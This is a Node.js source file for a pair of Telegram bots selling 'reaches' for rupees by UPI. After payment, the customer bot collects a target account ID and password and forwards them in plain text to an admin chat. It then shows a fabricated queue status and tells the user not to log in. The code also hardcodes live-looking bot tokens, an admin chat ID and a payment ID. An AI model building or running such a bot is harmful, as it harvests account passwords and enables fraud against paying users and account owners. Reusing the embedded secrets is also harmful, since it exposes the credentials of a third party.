const TelegramBot = require('node-telegram-bot-api');
const cron = require('node-cron');

// --- Configuration ---
const CUSTOMER_BOT_TOKEN = '8874503246:AAEmdPcVJMQ3q6pmINsP_Tcwium3ANV4T6I';
const ADMIN_BOT_TOKEN = '8787715855:AAF9PLZkk_tOb28TYcyTcAs_NszwURnzhkw';
const ADMIN_CHAT_ID = '7659178694';
const UPI_ID = 'paytm.s2ujlw0@pty';

const customerBot = new TelegramBot(CUSTOMER_BOT_TOKEN, { polling: true });
const adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

// Database Storage
let users = {};
let userState = {}; 
let pendingTx = {};

// Helper: Get Main Keyboard
const getMainKeyboard = () => ({
    reply_markup: {
        keyboard: [
            [{ text: '💳 Buy Reaches' }, { text: '📤 Submit Credentials' }],
            [{ text: '👤 My Profile' }]
        ],
        resize_keyboard: true
    }
});

// ==========================================
// 🕒 AUTOMATIC HOURLY MESSAGES (9 AM to 8 PM)
// ==========================================
// Cron pattern: Every hour at minute 0, between hours 9 and 20
cron.schedule('0 9-20 * * *', async () => {
    const currentHour = new Date().getHours();
    let greeting = "✨ Hope you are having a great day!";

    if (currentHour >= 9 && currentHour < 12) {
        greeting = "☀️ *Good Morning!* Have a productive day ahead with JPW Reached Services!";
    } else if (currentHour >= 12 && currentHour < 17) {
        greeting = "🌤️ *Good Afternoon!* Need more reaches? Check our packages now!";
    } else if (currentHour >= 17 && currentHour <= 20) {
        greeting = "🌆 *Good Evening!* Finish your daily orders easily with JPW Services!";
    }

    const broadcastMessage = `${greeting}\n\n🤖 *JPW REACHED SERVICES BOT*\nClick below to access our services anytime.`;

    // Send to all active users
    for (const chatId in users) {
        try {
            await customerBot.sendMessage(chatId, broadcastMessage, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error(`Failed to send hourly message to ${chatId}:`, err.message);
        }
    }
}, {
    scheduled: true,
    timezone: "Asia/Kolkata"
});

// ==========================================
// 1. START COMMAND & MAIN MENU
// ==========================================
customerBot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!users[chatId]) users[chatId] = { reaches: 0 };
    userState[chatId] = null; 

    customerBot.sendMessage(
        chatId,
        `✨ *Welcome to JPW REACHED SERVICES BOT*\n\nPlease choose an option from below:`,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );
});

// ==========================================
// 2. MESSAGE HANDLER
// ==========================================
customerBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text || text.startsWith('/')) return;

    if (!users[chatId]) users[chatId] = { reaches: 0 };
    const currentState = userState[chatId] ? userState[chatId].step : null;

    // --- Main Menu Buttons ---
    if (text === '👤 My Profile') {
        return customerBot.sendMessage(
            chatId,
            `👤 *Your Profile*\n\n🆔 Telegram ID: \`${chatId}\`\n📍 Available Reaches: *${users[chatId].reaches}*`,
            { parse_mode: 'Markdown' }
        );
    }

    if (text === '💳 Buy Reaches') {
        userState[chatId] = null;
        return customerBot.sendMessage(chatId, `💳 *Select a Reach Package:*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '1 Reach — ₹20', callback_data: 'buy_pack_1' }],
                    [{ text: '3 Reaches — ₹55', callback_data: 'buy_pack_3' }],
                    [{ text: '6 Reaches — ₹100', callback_data: 'buy_pack_6' }],
                    [{ text: '14 Reaches — ₹200', callback_data: 'buy_pack_14' }]
                ]
            }
        });
    }

    if (text === '📤 Submit Credentials') {
        if (users[chatId].reaches <= 0) {
            return customerBot.sendMessage(chatId, `❌ *Insufficient Reaches!*\nPlease buy reaches first.`);
        }
        userState[chatId] = { step: 'AWAITING_TARGET_ID' };
        return customerBot.sendMessage(chatId, `🔑 *Step 1/2:* Please send your *Target ID*:`, { parse_mode: 'Markdown' });
    }

    // --- Step-by-Step Inputs Handling ---
    if (currentState === 'AWAITING_UTR') {
        const utrNumber = text.trim();
        const pkg = userState[chatId].pkg;
        userState[chatId] = null;

        pendingTx[utrNumber] = { telegramId: chatId, reachesToAdd: pkg.reaches };

        // Notify Customer
        await customerBot.sendMessage(chatId, `⏳ *Payment Received*\n\nYour UTR (\`${utrNumber}\`) is under verification.`, { parse_mode: 'Markdown' });

        // Notify Admin
        return adminBot.sendMessage(
            ADMIN_CHAT_ID,
            `🔔 *New Payment Request*\n\n👤 User ID: \`${chatId}\`\n📦 Reaches: ${pkg.reaches}\n💰 Amount: ₹${pkg.amount}\n🆔 UTR: \`${utrNumber}\``,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Accept', callback_data: `accept_${utrNumber}` },
                            { text: '❌ Reject', callback_data: `reject_${utrNumber}` }
                        ]
                    ]
                }
            }
        );
    }

    if (currentState === 'AWAITING_TARGET_ID') {
        userState[chatId] = { step: 'AWAITING_PASSWORD', targetId: text.trim() };
        return customerBot.sendMessage(chatId, `🔒 *Step 2/2:* Now send your *Password*:`, { parse_mode: 'Markdown' });
    }

    if (currentState === 'AWAITING_PASSWORD') {
        const targetId = userState[chatId].targetId;
        const targetPass = text.trim();
        userState[chatId] = null;

        users[chatId].reaches -= 1;

        // Notify Admin with Credentials
        await adminBot.sendMessage(
            ADMIN_CHAT_ID,
            `📤 *New Credentials Submitted*\n\n👤 User ID: \`${chatId}\`\n🔑 Target ID: \`${targetId}\`\n🔒 Password: \`${targetPass}\``,
            { parse_mode: 'Markdown' }
        );

        // Queue Status Message to Customer
        const queueMsg = `
🤖 *JPW REACHED SERVICES BOT STATUS*

✅ Status: Queued
👤 User ID: \`${targetId}\`
⏰ Time: Just now

📍 Queue Position: 1/1
⏳ Action Required: Please do not log in to your ID. Estimated wait time: 1.5 min.

📋 Work Orders:
  🎯 Work Order Process Started

🔄 Status: Processing...
`.trim();

        return customerBot.sendMessage(chatId, queueMsg, { parse_mode: 'Markdown' });
    }
});

// ==========================================
// 3. CALLBACK QUERY HANDLERS (Package Selection)
// ==========================================
customerBot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    let pkg = { reaches: 1, amount: 20 };
    if (data === 'buy_pack_3') pkg = { reaches: 3, amount: 55 };
    if (data === 'buy_pack_6') pkg = { reaches: 6, amount: 100 };
    if (data === 'buy_pack_14') pkg = { reaches: 14, amount: 200 };

    userState[chatId] = { step: 'AWAITING_UTR', pkg };

    const upiLink = `upi://pay?pa=${UPI_ID}&pn=Paytm&am=${pkg.amount}&cu=INR`;
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;

    await customerBot.sendPhoto(chatId, qrUrl, {
        caption: `💳 *Payment Details*\n\n📦 Package: *${pkg.reaches} Reach(es)*\n💰 Amount: *₹${pkg.amount}*\n🆔 UPI ID: \`${UPI_ID}\`\n\n👇 *Please reply with your 12-digit UTR Number after paying:*`,
        parse_mode: 'Markdown'
    });

    customerBot.answerCallbackQuery(query.id);
});

// ==========================================
// 4. ADMIN ACCEPT / REJECT ACTIONS
// ==========================================
adminBot.on('callback_query', async (query) => {
    const action = query.data;
    const [type, utrNumber] = action.split('_');

    const tx = pendingTx[utrNumber];
    if (!tx) {
        return adminBot.answerCallbackQuery(query.id, { text: 'Transaction not found or expired!' });
    }

    const { telegramId, reachesToAdd } = tx;

    if (type === 'accept') {
        if (!users[telegramId]) users[telegramId] = { reaches: 0 };
        users[telegramId].reaches += reachesToAdd;

        await customerBot.sendMessage(
            telegramId,
            `✅ *REACHED SUCCESSFULLY*\n\n👤 Tech ID: \`${telegramId}\`\n📊 Status: SUCCESS\n📍 Total Reaches: \`${users[telegramId].reaches}\``,
            { parse_mode: 'Markdown' }
        );

        await adminBot.editMessageText(`✅ *Accepted & Processed*\n\n👤 User: \`${telegramId}\`\n🆔 UTR: \`${utrNumber}\``, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    } else {
        await customerBot.sendMessage(telegramId, `❌ *Payment Rejected*\n\nYour payment (UTR: \`${utrNumber}\`) was rejected.`);
        await adminBot.editMessageText(`❌ *Rejected*\n\n👤 User: \`${telegramId}\`\n🆔 UTR: \`${utrNumber}\``, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    }

    delete pendingTx[utrNumber];
    adminBot.answerCallbackQuery(query.id);
});

console.log('Bot server with hourly scheduler is running...');
                                         
